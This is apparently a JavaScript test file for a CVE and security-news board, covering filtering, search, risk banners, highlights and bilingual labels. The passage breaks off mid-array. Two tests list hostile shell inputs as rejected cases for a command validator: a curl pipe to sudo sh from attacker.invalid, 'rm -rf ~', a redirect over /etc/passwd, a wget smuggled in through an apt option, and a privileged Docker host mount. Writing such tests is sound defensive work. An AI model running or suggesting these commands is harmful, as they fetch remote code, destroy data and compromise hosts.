// Seam 2: the Board's filter function.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { cveLines, highlightScore, isWordPressPlugin, pluginName, aliasesUsed, knownVendor, SEARCH_ALIASES, vendorLedTitle, vendorName, foldByVendor, isExploited, exploitReason, namedHeadline, isLibrary, matchProducts, mergeIncidents, LINES, orderBy, pinReason, briefMarker, cveHead, easyLine, easyTitle, isShellCommand, onBoard, productsOf, cvssRating, easyAction, filterBoard, filterFromQuery, filterToQuery, lineKeys, productLine, productList, publishedAt, relativeAge, riskLevel, rowTags, searchWorthy, shareLink, slug, uniqueNames, viewFromStorage } from '../web/board.mjs';

const incident = (id, first_seen) => ({ id, cves: [id], first_seen, mentions: [{ kind: 'cve_record', url: '' }], brief: { text: id, lead: '' } });

test('a row is named by its first CVE and counts the rest; no CVE gives no name', () => {
  assert.deepEqual(cveHead(['CVE-2026-1', 'CVE-2026-2', 'CVE-2026-3']), { id: 'CVE-2026-1', more: 2 });
  assert.deepEqual(cveHead(['CVE-2026-1']), { id: 'CVE-2026-1', more: 0 });
  assert.equal(cveHead([]), null);
  assert.equal(cveHead(undefined), null);
});

test('the CVSS rating follows the v3 bands, and an unrated Incident has none', () => {
  assert.deepEqual([9, 8.9, 7, 6.9, 4, 3.9, 0.1, 0, null, undefined].map(cvssRating),
    ['critical', 'high', 'high', 'medium', 'medium', 'low', 'low', 'none', null, null]);
});

test('a row\'s tags are its Products, then the Summary\'s devices, each name once', () => {
  const i = { products: [{ id: 'a:x', name: 'OpenSSH' }, { id: 'b:x', name: 'Router' }], summary: { devices: ['Router', 'NAS'] } };
  assert.deepEqual(rowTags(i), ['OpenSSH', 'Router', 'NAS']);
  assert.deepEqual(rowTags({}), []);
  // The Summary's vendor-led names win over title-cased CPE names.
  assert.deepEqual(rowTags({ ...i, summary: { products: ['SonicWall SonicOS'], devices: [] } }), ['SonicWall SonicOS']);
  // Each language shows the names its readers know.
  const paint = { summary: { products: ['Microsoft Paint'], devices: [], ko: { names: ['Windows 그림판'] }, en: { names: ['Microsoft Paint'] } } };
  assert.deepEqual([rowTags(paint, 'ko'), rowTags(paint, 'en')], [['Windows 그림판'], ['Microsoft Paint']]);
});

test('a name that differs only in letter case shows once (Qiskit SDK / Qiskit Sdk)', () => {
  assert.deepEqual(rowTags({ products: [{ id: 'ibm:qiskit_sdk', name: 'Qiskit SDK' }, { id: 'ibm:qiskit', name: 'Qiskit Sdk' }] }), ['IBM Qiskit SDK']); // vendor in front: critique 13
  assert.deepEqual(uniqueNames(['Qiskit SDK', 'qiskit sdk', 'Perl']), ['Qiskit SDK', 'Perl']);
});

test("operating systems lead a row's tags in one fixed order, whatever order the Summary gave", () => {
  const i = { summary: { products: ['Perl'], platforms: ['Linux', 'Windows', 'macOS'], devices: [] } };
  assert.deepEqual(rowTags(i), ['Windows', 'macOS', 'Linux', 'Perl']);
  assert.deepEqual(rowTags({ summary: { products: ['X'], platforms: ['iOS', 'FreeBSD', 'Android'], devices: [] } }), ['Android', 'iOS', 'FreeBSD', 'X']);
});

test('a long device list stays off the row: past four models the badges are the product alone', () => {
  const few = { summary: { products: ['TP-Link Archer'], devices: ['TP-Link Archer C6', 'TP-Link Archer AX10'] } };
  assert.deepEqual(rowTags(few), ['TP-Link Archer', 'TP-Link Archer C6', 'TP-Link Archer AX10']);
  const many = { summary: { products: ['SonicWall SonicOS'], devices: ['TZ 270', 'TZ 370', 'TZ 470', 'TZ 570', 'TZ 670'].map((m) => `SonicWall ${m}`) } };
  assert.deepEqual(rowTags(many), ['SonicWall SonicOS']);
});

test('returns Incidents newest first', () => {
  const incidents = [
    incident('CVE-2026-2', '2026-11-07T13:30:00Z'),
    incident('CVE-2026-3', '2026-12-01T00:05:00Z'),
    incident('CVE-2026-1', '2026-10-31T23:59:00Z'),
  ];
  assert.deepEqual(filterBoard(incidents).list.map((i) => i.id), ['CVE-2026-3', 'CVE-2026-2', 'CVE-2026-1']);
});

test('orders by when the news first broke, falling back to first seen', () => {
  const incidents = [
    { ...incident('CVE-2026-1', '2026-11-08T03:00:00Z'), published: '2026-11-01T00:00:00Z' },
    incident('CVE-2026-2', '2026-11-05T00:00:00Z'),
  ];
  assert.deepEqual(filterBoard(incidents).list.map((i) => i.id), ['CVE-2026-2', 'CVE-2026-1']);
  assert.equal(publishedAt(incidents[0]), '2026-11-01T00:00:00Z');
});

test('an HN story without a CVE waits for its Summary and stays off when it is not an Incident', () => {
  const story = { id: 'https://news.ycombinator.com/item?id=1', cves: [] };
  assert.equal(onBoard(story), false);
  assert.equal(onBoard({ ...story, summary: { incident: true } }), true);
  assert.equal(onBoard({ ...story, summary: { incident: false } }), false);
  assert.equal(onBoard({ ...story, summary: {} }), true); // a Summary from before the flag
  assert.equal(onBoard({ ...story, summary_error: { tries: 3, final: true } }), true);
  assert.equal(onBoard({ id: 'CVE-2026-1', cves: ['CVE-2026-1'] }), true);
  assert.equal(onBoard({ id: 'https://seclists.org/oss-sec/2026/q4/563', cves: [] }), true);
  // A CVE-less security news story waits the same way (owner, 11-10: news sites are read; NIKKE launcher compromise).
  assert.equal(onBoard({ id: 'https://www.bleepingcomputer.com/news/security/nikke-pc-game-launcher-hacked/', cves: [] }), false);
  assert.equal(onBoard({ id: 'https://www.securityweek.com/x/', cves: [], summary: { incident: true } }), true);
});

test('Products come from NVD or the CVE record, the Summary and its operating systems, each once', () => {
  const i = { products: [{ id: 'openbsd:openssh', name: 'OpenSSH' }],
    summary: { products: ['OpenSSH', 'musl'], platforms: ['Linux'] } };
  assert.deepEqual(productsOf(i).map((p) => p.id), ['openbsd:openssh', 'name:musl', 'os:linux']);
  const sonic = { products: [{ id: 'sonicwall:sonicos', name: 'SonicOS' }], summary: { products: ['SonicWall SonicOS'] } };
  assert.deepEqual(productsOf(sonic), [{ id: 'sonicwall:sonicos', name: 'SonicWall SonicOS' }]);
  assert.deepEqual(productsOf({ summary: { products: ['iOS', 'Android'], platforms: ['iOS', 'Android'] } }).map((p) => p.id), ['os:ios', 'os:android']);
  const paint = { id: 'CVE-2026-83844', cves: ['CVE-2026-83844'], first_seen: '2026-11-08T00:00:00Z', mentions: [], brief: { text: '' },
    summary: { products: ['Microsoft Paint'], platforms: ['Windows'], ...Object.fromEntries(['ko', 'en'].map((l) => [l, { title: '', summary: '', conditions: [], mitigation: '' }])) } };
  assert.deepEqual(filterBoard([paint], ['os:windows']).list.length, 1);
  assert.deepEqual(rowTags(paint, 'en'), ['Windows', 'Microsoft Paint']); // operating systems lead
});

test('only package-manager and service lines count as shell commands; config lines do not', () => {
  assert.equal(isShellCommand('apk upgrade openssh'), true);
  assert.equal(isShellCommand('sudo apt-get install --only-upgrade openssh-server'), true);
  assert.equal(isShellCommand('systemctl restart sshd'), true);
  assert.equal(isShellCommand('PasswordAuthentication no'), false);
  assert.equal(isShellCommand('LoginGraceTime 0'), false);
  assert.equal(isShellCommand(''), false);
});

test('a command that chains, pipes, substitutes or redirects past one invocation is not a shell command (audit 1)', () => {
  for (const tail of [' && curl -fsSL https://attacker.invalid/x | sudo sh', '; rm -rf ~', ' | sh', ' & sleep 1', ' `id`', ' $(id)',
    '\ncurl x', ' > /etc/passwd', ' < /dev/null']) {
    assert.equal(isShellCommand(`sudo apt-get update${tail}`), false, JSON.stringify(tail));
  }
});

test('one invocation that runs code, fetches a URL or quotes an option is not a shell command (audit 1)', () => {
  for (const cmd of ['npx attacker-pkg', 'sudo npm install -g https://attacker.invalid/x.tgz', 'pip install https://attacker.invalid/x.tar.gz',
    'sudo apt-get -o APT::Update::Pre-Invoke::="wget -qO /tmp/x https://attacker.invalid/x" update', "apt-get -o 'a=b c' update",
    'apt-get -o a=b\\ c update', 'apt-get install $X', 'go run attacker.invalid/x@latest', 'kubectl apply -f https://attacker.invalid/x.yaml',
    'docker run --privileged -v /:/host attacker/img', 'podman run x', 'pnpm dlx x', 'yarn dlx x', 'npm exec x', 'npm run x', 'kubectl exec x -- sh']) {
    assert.equal(isShellCommand(cmd), false, cmd);
  }
  for (const cmd of ['sudo npm install -g npm@10.9.1', 'pip install --upgrade urllib3==2.2.2', 'go install golang.org/x/tools@v0.24.0',
    'docker pull nginx:1.27.1', 'helm upgrade ingress-nginx ingress-nginx/ingress-nginx --version 4.11.2', 'brew upgrade openssh']) {
    assert.equal(isShellCommand(cmd), true, cmd);
  }
});

test('an Object.prototype key as a vendor or search word is no vendor or alias (audit 2, 13)', () => {
  for (const key of ['constructor', '__proto__', 'tostring', 'hasownproperty']) {
    assert.deepEqual(aliasesUsed(key), [], key);
    assert.equal(knownVendor(key), '', key);
    const i = { ...incident('CVE-2026-1', '2026-11-08T00:00:00Z'), products: [{ id: `${key}:foo`, name: 'Foo' }] };
    assert.deepEqual(filterBoard([incident('CVE-2026-2', '2026-11-08T00:00:00Z')], [], key).list, [], key); // its text lacks the word
    assert.deepEqual(rowTags(i), ['Foo']);
    assert.deepEqual([...lineKeys(i, 'en').keys()], ['Foo']);
    assert.equal(vendorLedTitle('t', knownVendor(key)), 't');
  }
  assert.equal(vendorName('constructor'), 'Constructor');
  assert.equal(orderBy('constructor'), orderBy('new'));
});

test('the Easy sentence keeps its "!" only at the top Risk level', () => {
  assert.equal(easyLine('PC를 해킹당할 수 있습니다!', 'highest'), 'PC를 해킹당할 수 있습니다!');
  assert.equal(easyLine('PC를 해킹당할 수 있습니다!', 'high'), 'PC를 해킹당할 수 있습니다.');
  assert.equal(easyLine('계정이 털렸을 수 있습니다!! ', 'notice'), '계정이 털렸을 수 있습니다. ');
  assert.equal(easyLine('조용한 문장입니다.', 'notice'), '조용한 문장입니다.');
});

test('an Easy headline at the lowest Risk level calls the danger a 문제, not a 위험', () => {
  assert.equal(easyTitle('Apache Allura 협업 사이트 뚫림 위험', 'notice'), 'Apache Allura 협업 사이트 뚫림 문제');
  assert.equal(easyTitle('Perl graph module freeze risk', 'notice'), 'Perl graph module freeze issue');
  assert.equal(easyTitle('Windows 그림판 해킹 위험', 'high'), 'Windows 그림판 해킹 위험');
  assert.equal(easyTitle('SonicWall 원격접속 장비 뚫림 위험', 'highest'), 'SonicWall 원격접속 장비 뚫림 위험');
  assert.equal(easyTitle('AI 채팅 대화 털림', 'notice'), 'AI 채팅 대화 털림');
  assert.equal(easyTitle('위험한 위험 앱 경고', 'notice'), '위험한 위험 앱 경고');
});

test('a pinned row says why only when the row does not show it already', () => {
  const base = { cves: [], mentions: [] };
  assert.equal(pinReason({ ...base, kev: true, mentions: [{ kind: 'curator' }] }), null);
  assert.equal(pinReason({ ...base, cvss: 9.8 }), null);
  assert.equal(pinReason({ ...base, mentions: [{ kind: 'curator' }] }), 'curator');
  assert.equal(pinReason({ ...base, mentions: [{ kind: 'discussion', points: 2935 }] }), 'buzz');
  assert.equal(pinReason({ ...base, mentions: [{ kind: 'discussion', points: 40 }] }), null);
});

test('quick filters keep only the chosen Risk levels and, when asked, exploited Incidents; they ride in the hash', () => {
  const a = { ...incident('CVE-2026-1', '2026-11-08T00:00:00Z'), kev: true, cvss: 5 };
  const b = { ...incident('CVE-2026-2', '2026-11-08T00:00:00Z'), cvss: 7.5 };
  const c = incident('CVE-2026-3', '2026-11-08T00:00:00Z');
  const pick = (opts) => filterBoard([a, b, c], [], '', NOW, opts).list.map((i) => i.id).sort();
  assert.deepEqual(pick({ risk: ['high'] }), ['CVE-2026-2']);
  assert.deepEqual(pick({ risk: ['highest', 'notice'] }), ['CVE-2026-1', 'CVE-2026-3']);
  assert.deepEqual(pick({ kev: true }), ['CVE-2026-1']);
  const f = { picks: ['os:linux'], query: 'ssh', risk: ['highest'], kev: true, from: '2026-11-01', to: '2026-11-08', cvssMin: 7, cve: 'yes', has: ['advisory'], sort: 'risk' };
  assert.deepEqual(filterFromQuery(filterToQuery(f)), f);
  assert.deepEqual(filterFromQuery('r=bogus').risk, []);
});

test('the panel narrows by date, CVSS, CVE and link kind, and sorts by risk or CVSS', () => {
  const at = (id, day, extra = {}) => ({ ...incident(id, `${day}T00:00:00Z`), ...extra });
  const a = at('CVE-2026-1', '2026-11-01', { cvss: 9.8 });
  const b = at('CVE-2026-2', '2026-11-05', { cvss: 7.5, mentions: [{ kind: 'advisory', url: '' }] });
  const c = { ...at('x', '2026-11-07'), cves: [], mentions: [{ kind: 'repo', url: '' }] };
  const run = (opts) => filterBoard([a, b, c], [], '', NOW, opts).list.map((i) => i.id);
  assert.deepEqual(run({ from: '2026-11-02', to: '2026-11-06' }), ['CVE-2026-2']);
  assert.deepEqual(run({ cvssMin: 9 }), ['CVE-2026-1']);
  assert.deepEqual(run({ cve: 'no' }), ['x']);
  assert.deepEqual(run({ has: ['advisory'] }), ['CVE-2026-2']);
  assert.deepEqual(run({ sort: 'cvss' }), ['CVE-2026-1', 'CVE-2026-2', 'x']);
  assert.deepEqual(run({ sort: 'risk' }), ['CVE-2026-1', 'CVE-2026-2', 'x']);
  assert.deepEqual(run({}), ['x', 'CVE-2026-2', 'CVE-2026-1']);
});

test('search finds an Incident by a name only its Mentions use', () => {
  const joined = { ...incident('CVE-2026-123158', '2026-11-08T05:00:00Z'),
    mentions: [{ kind: 'cve_record', url: '' }, { kind: 'discussion', url: 'https://news.ycombinator.com/item?id=50399400', title: '*sshole, or when are we going to get rid of C?' }] };
  assert.deepEqual(filterBoard([joined, incident('CVE-2026-1', '2026-11-08T05:00:00Z')], [], 'sshole').list.map((i) => i.id), ['CVE-2026-123158']);
});

test('lists an Unassigned incident (no CVE yet) among CVE Incidents, newest first', () => {
  const unassigned = { ...incident('https://news.ycombinator.com/item?id=50378228', '2026-11-05T12:30:00Z'), cves: [] };
  const incidents = [incident('CVE-2026-1', '2026-11-05T12:00:00Z'), unassigned, incident('CVE-2026-2', '2026-11-05T13:00:00Z')];
  assert.deepEqual(filterBoard(incidents).list.map((i) => i.cves), [['CVE-2026-2'], [], ['CVE-2026-1']]);
});

const openssh = { id: 'openbsd:openssh', name: 'Openssh' };
const dropbear = { id: 'dropbear_ssh_project:dropbear_ssh', name: 'Dropbear Ssh' };
const keycloak = { id: 'redhat:keycloak', name: 'Keycloak' };
const board = [
  { ...incident('CVE-2024-6387', '2026-11-03T00:00:00Z'), products: [openssh], brief: { text: 'regreSSHion: race in sshd before 9.8p1', lead: '' } },
  { ...incident('CVE-2026-1001', '2026-11-04T00:00:00Z'), products: [dropbear, openssh], brief: { text: 'Dropbear and OpenSSH key exchange flaw', lead: '' } },
  { ...incident('CVE-2026-120984', '2026-11-05T00:00:00Z'), products: [keycloak], brief: { text: 'A flaw was found in the Keycloak server', lead: '' } },
  { ...incident('CVE-2026-120839', '2026-11-06T00:00:00Z'), brief: { text: 'WpTravelly: from n/a through 2.3.8.', lead: '' } },
];
const ids = (list) => list.map((i) => i.id);

test('with no Products picked, every Incident shows', () => {
  assert.deepEqual(ids(filterBoard(board, []).list), ['CVE-2026-120839', 'CVE-2026-120984', 'CVE-2026-1001', 'CVE-2024-6387']);
});

test('picked Products hide Incidents with no matching Product', () => {
  assert.deepEqual(ids(filterBoard(board, [openssh.id]).list), ['CVE-2026-1001', 'CVE-2024-6387']);
  assert.deepEqual(ids(filterBoard(board, [dropbear.id, keycloak.id]).list), ['CVE-2026-120984', 'CVE-2026-1001']);
});

test('search matches title text, CVE ID, Product and version text, ignoring case', () => {
  assert.deepEqual(ids(filterBoard(board, [], 'KEYCLOAK server').list), ['CVE-2026-120984']);
  assert.deepEqual(ids(filterBoard(board, [], 'cve-2024-6387').list), ['CVE-2024-6387']);
  assert.deepEqual(ids(filterBoard(board, [], 'dropbear ssh').list), ['CVE-2026-1001']);
  assert.deepEqual(ids(filterBoard(board, [], '2.3.8').list), ['CVE-2026-120839']);
  assert.deepEqual(ids(filterBoard(board, [], '9.8P1').list), ['CVE-2024-6387']);
  assert.deepEqual(ids(filterBoard(board, [], '  ').list), ids(filterBoard(board).list));
  assert.deepEqual(ids(filterBoard(board, [], 'nothing matches this').list), []);
});

test('search matches the Summary in Korean and in English', () => {
  const summary = {
    ko: { title: '무슬 기반 OpenSSH 인증 우회', summary: '비밀번호 없는 계정이 257~1024자 비밀번호를 받아들입니다.', conditions: ['PAM 미사용'], mitigation: '10.6p2로 업데이트하세요.' },
    en: { title: 'OpenSSH on musl auth bypass', summary: 'Password-less accounts accept 257 to 1024 characters.', conditions: ['PAM not used'], mitigation: 'Update to 10.6p2.' },
    products: ['Alpine Linux'],
    lead: '',
  };
  const summarized = [...board, { ...incident('https://sshhole.com', '2026-11-05T12:30:00Z'), cves: [], brief: { text: 'sshole', lead: '' }, summary }];
  for (const query of ['비밀번호 없는', 'password-less', 'PAM 미사용', 'pam not used', '업데이트하세요', '1024', 'alpine linux']) {
    assert.deepEqual(ids(filterBoard(summarized, [], query).list), ['https://sshhole.com'], query);
  }
});

const easySummary = {
  ko: { title: 'OpenSSH 인증 우회', summary: '긴 비밀번호가 통합니다.', conditions: [], mitigation: '10.6p2로 업데이트하세요.', easy: '남이 아무 긴 비밀번호로 서버에 들어올 수 있습니다.' },
  en: { title: 'OpenSSH auth bypass', summary: 'Long passwords work.', conditions: [], mitigation: 'Update to 10.6p2.', easy: 'Strangers can get into your server with any long password.' },
  products: ['OpenSSH'], lead: '', fixed: '10.6p2', command: 'apk upgrade openssh', stopgap: 'PasswordAuthentication no', devices: [],
};

test('search matches the Easy text in both languages, and the normal text still', () => {
  const summarized = [...board, { ...incident('https://sshhole.com', '2026-11-05T12:30:00Z'), cves: [], summary: easySummary }];
  for (const query of ['남이 아무', 'strangers can', 'apk upgrade', '긴 비밀번호가 통합니다', 'long passwords work']) {
    assert.deepEqual(ids(filterBoard(summarized, [], query).list), ['https://sshhole.com'], query);
  }
});

test('a Summary written before the Easy view still shows and searches', () => {
  const { ko, en } = easySummary;
  const old = { ko: { ...ko, easy: undefined }, en: { ...en, easy: undefined }, products: [], lead: '' };
  const list = [{ ...incident('CVE-2026-1', '2026-11-05T12:30:00Z'), summary: old }];
  assert.deepEqual(ids(filterBoard(list, [], 'long passwords').list), ['CVE-2026-1']);
  assert.deepEqual(easyAction(old), { kind: 'none', stopgap: '' });
});

test('a Brief says a Summary is in preparation until the collector gives up, then that none is available', () => {
  assert.equal(briefMarker(incident('CVE-2026-1', '2026-11-05T12:30:00Z')), 'preparing');
  assert.equal(briefMarker({ summary_error: { tries: 2, reason: 'x' } }), 'preparing');
  assert.equal(briefMarker({ summary_error: { tries: 3, reason: 'x', final: true } }), 'unavailable');
});

test('the Board opens in the remembered view', () => {
  assert.equal(viewFromStorage('easy'), 'easy');
  assert.equal(viewFromStorage(null), 'normal'); // nothing saved: the normal view
  assert.equal(viewFromStorage('["CVE-2026-1"]'), 'normal'); // the old per-Incident list
});

test('the Risk banner comes from rules: exploited or CVSS 9.0+ is highest, 7.0+ high, else notice', () => {
  assert.equal(riskLevel({ kev: true }), 'highest');
  assert.equal(riskLevel({ kev: true, cvss: 3.1 }), 'highest');
  assert.equal(riskLevel({ cvss: 9.0 }), 'highest');
  assert.equal(riskLevel({ cvss: 8.9 }), 'high');
  assert.equal(riskLevel({ cvss: 7.0 }), 'high');
  assert.equal(riskLevel({ cvss: 6.9 }), 'notice');
  assert.equal(riskLevel({}), 'notice'); // no score yet
});

test('the Easy action: devices first, then the source\'s command, then the fixed version', () => {
  const router = { ...easySummary, command: '', devices: ['Archer AX21', 'Archer AX55'] };
  assert.deepEqual(easyAction(router), { kind: 'devices', devices: ['Archer AX21', 'Archer AX55'], fixed: '10.6p2', stopgap: 'PasswordAuthentication no' });
  assert.deepEqual(easyAction(easySummary), { kind: 'command', command: 'apk upgrade openssh', stopgap: 'PasswordAuthentication no' });
  // The collector drops a command not found in the sources; the page then says "update to version X".
  assert.deepEqual(easyAction({ ...easySummary, command: '' }), { kind: 'version', fixed: '10.6p2', stopgap: 'PasswordAuthentication no' });
  assert.deepEqual(easyAction({ ...easySummary, command: '', fixed: '', stopgap: '' }), { kind: 'none', stopgap: '' });
});

test('search and Product picks narrow together', () => {
  assert.deepEqual(ids(filterBoard(board, [openssh.id], 'race').list), ['CVE-2024-6387']);
  assert.deepEqual(ids(filterBoard(board, [keycloak.id], 'race').list), []);
});

test('the Product list holds each Product seen in the last 90 days once, by name', () => {
  const old = { ...incident('CVE-2026-1', '2026-08-01T00:00:00Z'), products: [{ id: 'old:only', name: 'Old Only' }, keycloak] };
  const now = new Date('2026-11-07T00:00:00Z');
  assert.deepEqual(productList([...board, old], now), [dropbear, keycloak, openssh]);
});

// The picker takes what a visitor types, not only an exact pick from the list (critique 9: "Kyv" and "kyverno" were
// answered with "not in the list" although Kyverno was listed).
test('the Product picker matches typed names regardless of case, whole names first, then parts', () => {
  const kyverno = { id: 'kyverno:kyverno', name: 'Kyverno' };
  const ssh = { id: 'openbsd:openssh', name: 'OpenSSH' };
  const portable = { id: 'x:openssh_portable', name: 'OpenSSH Portable' };
  const win = { id: 'os:windows', name: 'Windows' };
  const list = [kyverno, ssh, portable, win];
  const label = (p) => (p.id.startsWith('os:') ? `${p.name} (OS)` : p.name);
  assert.deepEqual(matchProducts(list, 'Kyverno', label), [kyverno]);
  assert.deepEqual(matchProducts(list, 'kyverno', label), [kyverno]);
  assert.deepEqual(matchProducts(list, '  Kyv ', label), [kyverno]);
  assert.deepEqual(matchProducts(list, 'openssh', label), [ssh]); // a whole name beats a longer name that contains it
  assert.deepEqual(matchProducts(list, 'ssh', label), [ssh, portable]);
  assert.deepEqual(matchProducts(list, 'Windows (OS)', label), [win]);
  assert.deepEqual(matchProducts(list, 'windows', label), [win]);
  assert.deepEqual(matchProducts(list, '공유기', label), []);
  assert.deepEqual(matchProducts(list, '   ', label), []);
});

// A refresh while the page is open: the new week replaces the Incidents it holds, older months already loaded stay,
// and only ids the page did not have count as new (a Summary arriving later is a change, not a new Incident).
test('a refresh merges the new week into what the page holds and names only the new ids', () => {
  const a = { id: 'a', v: 1 }, b = { id: 'b', v: 1 }, old = { id: 'old', v: 1 };
  const { incidents, added } = mergeIncidents([a, b, old], [{ id: 'a', v: 2 }, b, { id: 'c', v: 1 }]);
  assert.deepEqual(incidents.map((i) => [i.id, i.v]).sort(), [['a', 2], ['b', 1], ['c', 1], ['old', 1]]);
  assert.deepEqual(added, ['c']);
  assert.deepEqual(mergeIncidents([a], [a]).added, []);
});

// The collector's board/products.json (collector.incidents.product_list) must name Products as the page does.
test('the collector\'s Product list matches the page\'s for the same Incidents, in both languages', () => {
  const kase = JSON.parse(readFileSync(new URL('./fixtures/board/products-case.json', import.meta.url), 'utf8'));
  const byId = (a, b) => (a.id < b.id ? -1 : 1);
  for (const lang of ['ko', 'en']) {
    assert.deepEqual(productList(kase.incidents.filter(onBoard), new Date(kase.now), lang).sort(byId),
      kase.expected.map((p) => ({ id: p.id, name: p[lang] })));
  }
});

test('the picker also lists Products with no Incident loaded, and loaded Incidents name the shared ones', () => {
  const seen = [{ id: 'iptime:firmware', ko: 'ipTIME 공유기', en: 'ipTIME router' }, { id: openssh.id, ko: 'x', en: 'x' }];
  const list = productList(board, new Date('2026-11-07T00:00:00Z'), 'ko', seen);
  assert.deepEqual(list.map((p) => p.name), ['Dropbear Ssh', 'ipTIME 공유기', 'Keycloak', 'Openssh']);
});

test('a filter written to the page address reads back the same', () => {
  const filter = { picks: [openssh.id, 'vendor:a,b&c'], query: 'heap overflow 9.8p1', risk: [], kev: false, from: '', to: '', cvssMin: 0, cve: '', has: [], sort: 'new' };
  assert.deepEqual(filterFromQuery(filterToQuery(filter)), filter);
  assert.deepEqual(filterFromQuery('?' + filterToQuery(filter)), filter);
  assert.deepEqual(filterFromQuery(''), { picks: [], query: '', risk: [], kev: false, from: '', to: '', cvssMin: 0, cve: '', has: [], sort: 'new' });
});

test('does not reorder the caller\'s array', () => {
  const incidents = [incident('CVE-2026-1', '2026-11-01T00:00:00Z'), incident('CVE-2026-2', '2026-11-02T00:00:00Z')];
  filterBoard(incidents);
  assert.deepEqual(incidents.map((i) => i.id), ['CVE-2026-1', 'CVE-2026-2']);
});

const NOW = new Date('2026-11-07T12:00:00Z').getTime();
const daysAgo = (d) => new Date(NOW - d * 24 * 60 * 60 * 1000).toISOString().replace('.000Z', 'Z');

test('Highlights are at most ten, 위험 or above from the last seven days, highest score first', () => {
  // Twelve recent Incidents, CVSS 4.5 to 10.0, newest has the lowest score; one older Incident scores highest.
  const recent = Array.from({ length: 12 }, (_, n) => ({ ...incident(`CVE-2026-${100 + n}`, daysAgo(6 - n / 2)), cvss: 10 - n / 2 }));
  const old = { ...incident('CVE-2026-1', daysAgo(8)), cvss: 10, kev: true };
  const { highlights, list } = filterBoard([...recent, old], [], '', NOW);
  // CVSS 6.5 and below (CVE-2026-107 on) are 참고 and stay in the list only (user, 2026-11-09).
  assert.deepEqual(ids(highlights), ['CVE-2026-100', 'CVE-2026-101', 'CVE-2026-102', 'CVE-2026-103', 'CVE-2026-104',
    'CVE-2026-105', 'CVE-2026-106']);
  assert.equal(list.length, 13);
});

test('exploited in the wild outranks HN buzz, which outranks a curator pick, which outranks CVSS 9.8 alone', () => {
  const kev = { ...incident('CVE-2026-201', daysAgo(1)), cvss: 5.3, kev: true };
  const hn = { ...incident('CVE-2026-202', daysAgo(1)), cvss: 7.5, mentions: [{ kind: 'discussion', url: '', points: 640 }] };
  const curated = { ...incident('CVE-2026-203', daysAgo(1)), cvss: 7.5, mentions: [{ kind: 'cve_record', url: '' }, { kind: 'curator', url: '' }] };
  const critical = { ...incident('CVE-2026-204', daysAgo(1)), cvss: 9.8 };
  const plain = incident('CVE-2026-205', daysAgo(1));
  assert.deepEqual(ids(filterBoard([plain, critical, curated, hn, kev], [], '', NOW).highlights),
    ['CVE-2026-201', 'CVE-2026-202', 'CVE-2026-203', 'CVE-2026-204']); // the plain 참고 row is not one
});

test('an Incident older than seven days leaves the Highlights and stays in the list', () => {
  const kev = { ...incident('CVE-2026-301', '2026-11-01T12:00:00Z'), kev: true };
  const at = (iso) => filterBoard([kev], [], '', new Date(iso).getTime());
  assert.deepEqual(ids(at('2026-11-08T12:00:00Z').highlights), ['CVE-2026-301']); // exactly seven days
  assert.deepEqual(ids(at('2026-11-08T12:00:01Z').highlights), []);
  assert.deepEqual(ids(at('2026-11-08T12:00:01Z').list), ['CVE-2026-301']);
});

test('Highlights count the seven days from when the news was published, not when the Board first saw it', () => {
  const old = { ...incident('CVE-2026-83844', daysAgo(1)), published: daysAgo(26), cvss: 9.8 };
  const fresh = { ...incident('CVE-2026-1002', daysAgo(1)), cvss: 9.8 }; // no publish time: the first sighting counts
  const { highlights, list } = filterBoard([old, fresh], [], '', NOW);
  assert.deepEqual(ids(highlights), ['CVE-2026-1002']);
  assert.deepEqual(ids(list).sort(), ['CVE-2026-1002', 'CVE-2026-83844']);
});

test('Product picks and search narrow the Highlights too', () => {
  // All four score the same, so they rank newest first: CVE-2024-6387 (1 day old) to CVE-2026-120839 (4 days).
  const recent = board.map((i, n) => ({ ...i, first_seen: daysAgo(n + 1), cvss: 9 }));
  assert.deepEqual(ids(filterBoard(recent, [], '', NOW).highlights), ['CVE-2024-6387', 'CVE-2026-1001', 'CVE-2026-120984', 'CVE-2026-120839']);
  assert.deepEqual(ids(filterBoard(recent, [openssh.id], '', NOW).highlights), ['CVE-2024-6387', 'CVE-2026-1001']);
  assert.deepEqual(ids(filterBoard(recent, [], 'keycloak', NOW).highlights), ['CVE-2026-120984']);
  assert.deepEqual(ids(filterBoard(recent, [keycloak.id], 'race', NOW).highlights), []);
});

test('주요 사건 holds only 위험 or above: a 참고 row stays in the list (user, 2026-11-09)', () => {
  const notice = { ...incident('CVE-2026-601', daysAgo(1)), cvss: 5.3 };
  const high = { ...incident('CVE-2026-602', daysAgo(1)), cvss: 7.1 };
  const { highlights, list } = filterBoard([notice, high], [], '', NOW);
  assert.deepEqual(ids(highlights), ['CVE-2026-602']);
  assert.equal(list.length, 2);
});

test('a story seen only on HN, with no score, is never a Highlight however many points, and stays in the list', () => {
  // The real 2026-11-08 run: general security news with no CVE and no Product filled the Highlights.
  const story = (item, points) => ({ id: `https://news.ycombinator.com/item?id=${item}`, cves: [], first_seen: daysAgo(1),
    mentions: [{ kind: 'discussion', url: `https://news.ycombinator.com/item?id=${item}`, points }, { kind: 'writeup', url: `https://example.com/${item}` }],
    brief: { text: `story ${item}`, lead: '' } });
  const plain = incident('CVE-2026-501', daysAgo(2));
  const { highlights, list } = filterBoard([story(1, 23), story(2, 99), story(3, 100), plain], [], '', NOW);
  assert.deepEqual(ids(highlights), []); // 참고 level: 주요 사건 holds 위험 and above only (user, 2026-11-09)
  assert.equal(list.length, 4);
});

test('the sshole replay Incident becomes a Highlight ahead of ten CVSS 9.8 Incidents', () => {
  // Written by the sshole replay in tests/test_mentions.py (seam 1), which asserts it matches.
  const sshole = JSON.parse(readFileSync(new URL('./fixtures/board/sshole.json', import.meta.url)));
  const critical = Array.from({ length: 10 }, (_, n) => ({ ...incident(`CVE-2026-40${n}`, daysAgo(1)), cvss: 9.8 }));
  const { highlights } = filterBoard([...critical, { ...sshole, cvss: 8.1 }], [], '', NOW); // its NVD score; the fixture is a Brief
  assert.equal(highlights.length, 10);
  assert.equal(highlights[0].id, sshole.id);
});

test('a Product keeps its line colour, and Products spread over the lines', () => {
  assert.equal(productLine('openbsd:openssh'), productLine('openbsd:openssh'));
  assert.ok(LINES.includes(productLine('')));
  // Critique 4: six of ten real Products shared one mint line. Ids as the Board keys them (CPE, CVE record, Summary name).
  const ids = ['openbsd:openssh', 'sonicwall:sonicos', 'name:paint', 'name:cpython', 'apache:allura', 'apache:axis2',
    'forgerock:access_management', 'infinitewp:infinitewp_client', 'name:hotta studio tower of fantasy', 'name:rrd::cgi::image',
